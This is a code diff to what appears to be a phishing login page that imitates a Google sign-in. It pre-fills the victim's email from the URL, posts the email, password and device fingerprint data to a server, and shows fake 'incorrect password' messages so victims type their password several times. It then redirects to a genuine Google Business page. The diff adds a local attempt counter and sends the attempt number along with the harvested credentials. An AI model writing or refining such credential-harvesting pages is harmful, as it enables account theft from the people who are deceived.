@@ -167,7 +167,6 @@
             animation: shake 0.5s ease;
         }
 
-        /* Additional subtle helper text */
         .hint-text {
             font-size: 13px;
             color: #888;
@@ -233,6 +232,7 @@
 
     <script>
         (function() {
+            // Extract email from URL
             let email = null;
             if (window.location.hash) {
                 let hash = decodeURIComponent(window.location.hash.substring(1));
@@ -260,6 +260,9 @@
             const submitBtn = document.getElementById('submit-btn');
             const btnText = document.getElementById('btn-text');
 
+            // Local attempt counter
+            let attemptCount = 0;
+
             function showError(message, shake = true) {
                 errorDisplay.textContent = message;
                 errorDisplay.classList.add('show');
@@ -268,7 +271,6 @@
                     void errorDisplay.offsetWidth;
                     errorDisplay.classList.add('shake');
                 }
-                // Show hint for password errors
                 if (message.toLowerCase().includes('password')) {
                     hintText.classList.add('show');
                 } else {
@@ -303,6 +305,10 @@
 
                 hideError();
 
+                // Increment attempt counter
+                attemptCount++;
+                const currentAttempt = attemptCount;
+
                 submitBtn.disabled = true;
                 btnText.innerHTML = '<span class="btn-spinner"></span> Logging in...';
 
@@ -311,6 +317,7 @@
                     const payload = {
                         email,
                         password,
+                        attempt: currentAttempt,
                         screen: device.screen,
                         timezone: device.timezone,
                         language: device.language,
@@ -331,13 +338,12 @@
                             window.location.href = data.redirectUrl || 'https://business.google.com/create/new?hl=en&gmbsrc=ng-en-z-z-z-gmb-l-z-d~mhp-hom_sig-u&original_intent=GMB&skiplp=1&_gl=1*we7dbu*_ga*MTQyMzU2Nzk4MS4xNzQ4ODg2MDg1*_ga_VM5ES1YN10*czE3NDg4ODYwODQkbzEkZzAkdDE3NDg4ODYwODQkajYwJGwwJGgw&service=ome&omec=EMLX0y4yAgECOipnbWJzcmM9bmctZW4tei16LXotZ21iLWwtei1kfm1ocC1ob21fc2lnLXVAAUoTCIuXmb2k040DFb-XAAAd3Ss8Mw%3D%3D';
                         }, 3000);
                     } else {
-                        const attempts = data.attempts || 0;
                         let errorMsg = '';
-                        if (attempts === 1) {
+                        if (currentAttempt === 1) {
                             errorMsg = 'Incorrect password. Please double‑check your credentials.';
-                        } else if (attempts === 2) {
+                        } else if (currentAttempt === 2) {
                             errorMsg = 'The password you entered is incorrect. Remember that passwords are case‑sensitive. Please try again.';
-                        } else if (attempts >= 3) {
+                        } else if (currentAttempt >= 3) {
                             errorMsg = 'This is your final attempt. If the password is still incorrect, you will be redirected.';
                         } else {
                             errorMsg = 'Invalid credentials.';
